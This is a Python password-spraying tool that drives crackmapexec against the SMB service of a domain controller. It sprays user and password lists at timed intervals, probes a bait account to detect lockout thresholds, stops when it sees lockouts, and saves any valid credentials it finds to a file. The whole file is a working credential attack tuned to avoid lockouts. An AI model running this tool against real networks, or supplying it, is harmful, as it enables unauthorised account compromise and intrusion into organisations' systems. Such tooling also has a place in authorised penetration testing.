#!/usr/bin/env python3

import argparse
import subprocess
import sys
import time
from pathlib import Path

GREEN = "\033[92m"
RED = "\033[91m"
PURPLE = "\033[95m"
RESET = "\033[0m"

BAIT_PASSWORD = "Wr0n6P@S5w0rd"

def parse_args():
    p = argparse.ArgumentParser(description="Interval password spray via CME (with bait user & multiple attempts per interval)")
    p.add_argument('--dc-ip', required=True, help="Domain controller IP for crackmapexec")
    p.add_argument('-u', '--users', required=True, type=Path, help="File with one username per line")
    p.add_argument('-p', '--passwords', required=True, type=Path, help="File with one password per line")
    p.add_argument('-i', '--interval', required=True, type=int, help="Interval in minutes between password sprays")
    p.add_argument('-a', '--attempts', default=1, type=int, help="Number of spray attempts per interval (default: 1)")
    p.add_argument('-bu', '--bait-user', required=False, help="Bait user to spray with invalid password before each interval")
    p.add_argument('-l', '--logfile', required=True, type=Path, help="File to append all CME output to")
    return p.parse_args()

def load_list(path: Path):
    if not path.is_file():
        print(f"[-] File not found: {path}", file=sys.stderr)
        sys.exit(1)
    return [line.strip() for line in path.read_text().splitlines() if line.strip()]

def spray_password(dc_ip, users_file, password, logfile):
    cmd = [
        'crackmapexec', 'smb', dc_ip,
        '-u', str(users_file),
        '-p', password,
        '--continue-on-success'
    ]
    retry_count = 0
    max_retries = 5
    while True:
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout + result.stderr

        if not output.strip():
            retry_count += 1
            if retry_count > max_retries:
                print(f"{RED}[!] CME returned empty output after {max_retries} attempts. Exiting.{RESET}")
                sys.exit(1)
            print(f"{RED}[!] CME returned empty output. Retrying password '{password}' in 3 minutes... (Attempt {retry_count}/{max_retries}){RESET}")
            time.sleep(180)
            continue

        with open(logfile, 'a') as f:
            f.write(f"\n=== [{time.strftime('%Y-%m-%d %H:%M:%S')}] password: {password} ===\n")
            f.write(output)
        return output

def spray_bait_user(dc_ip, bait_user, logfile):
    bait_file = Path(".bait_user.tmp")
    bait_file.write_text(bait_user + "\n")
    print(f"[>] Spraying bait user {bait_user} with invalid password {BAIT_PASSWORD}")
    output = spray_password(dc_ip, bait_file, BAIT_PASSWORD, logfile)
    bait_file.unlink()
    return output

def check_lockouts(out, users):
    locked = set()
    for line in out.splitlines():
        if "ACCOUNT_LOCKED_OUT" in line:
            for token in line.split():
                if ':' in token:
                    user_part = token.split(':')[0]
                    username = user_part.split('\\')[-1]
                    if username in users:
                        locked.add(username)
    return locked

def check_valid_creds(out, users):
    valid_creds = []
    for line in out.splitlines():
        if '[+]' in line:
            for token in line.split():
                if ':' in token:
                    user_part = token.split(':')[0]
                    username = user_part.split('\\')[-1]
                    if username in users:
                        valid_creds.append(token)
    return valid_creds

def check_disabled_or_expired(out, users):
    flagged = {}
    for line in out.splitlines():
        for status in ["STATUS_ACCOUNT_DISABLED", "STATUS_PASSWORD_EXPIRED"]:
            if status in line:
                for token in line.split():
                    if ':' in token:
                        user_part = token.split(':')[0]
                        username = user_part.split('\\')[-1]
                        if username in users:
                            flagged[username] = status
    return flagged

def main():
    args = parse_args()
    interval_seconds = args.interval * 60
    users = load_list(args.users)
    passwords = load_list(args.passwords)

    print(f"[+] Loaded {len(users)} users and {len(passwords)} passwords.")
    print(f"[+] Interval: {args.interval} minute(s)")
    print(f"[+] Attempts per interval: {args.attempts}")
    print(f"[+] Logging to {args.logfile}")
    if args.bait_user:
        print("\033[1;33m[!] Make sure to add the bait user to the top of users list as well.\033[0m")

    for i in range(0, len(passwords), args.attempts):
        attempt_passwords = passwords[i:i + args.attempts]

        if args.bait_user:
            bait_out = spray_bait_user(args.dc_ip, args.bait_user, args.logfile)
            bait_locked = check_lockouts(bait_out, users)
            if bait_locked:
                print(f"{RED}[!] Bait user '{args.bait_user}' got locked out!{RESET}")
                print(f"{RED}[!] Halting spray due to bait user lockout.{RESET}")
                sys.exit(0)

        for attempt, pwd in enumerate(attempt_passwords):
            print(f"[>] Spraying password: {pwd} (Attempt {attempt + 1}/{len(attempt_passwords)})")
            out = spray_password(args.dc_ip, args.users, pwd, args.logfile)

            valid_creds = check_valid_creds(out, users)
            for cred in valid_creds:
                print(f"{GREEN}[+] Valid credentials: {cred}{RESET}")
                with open('valid_credentials.txt', 'a') as vf:
                    vf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {cred}\n")

            flagged = check_disabled_or_expired(out, users)
            if flagged:
                print(f"{PURPLE}[!] Disabled or expired accounts detected:{RESET}")
                for user, reason in flagged.items():
                    print(f"{PURPLE}    - {user} ({reason}){RESET}")

            locked = check_lockouts(out, users)
            if locked:
                print(f"{RED}[!] Detected account lockout for:{RESET}")
                for u in locked:
                    print(f"{RED}    - {u}{RESET}")
                print(f"{RED}[!] Halting spray due to lockouts.{RESET}")
                sys.exit(0)

            if attempt < len(attempt_passwords) - 1:
                time.sleep(3)

        print(f"[+] Sleeping for {args.interval} minute(s)...")
        time.sleep(interval_seconds)

    print("[+] Finished spraying all passwords without lockouts.")

if __name__ == '__main__':
    main()
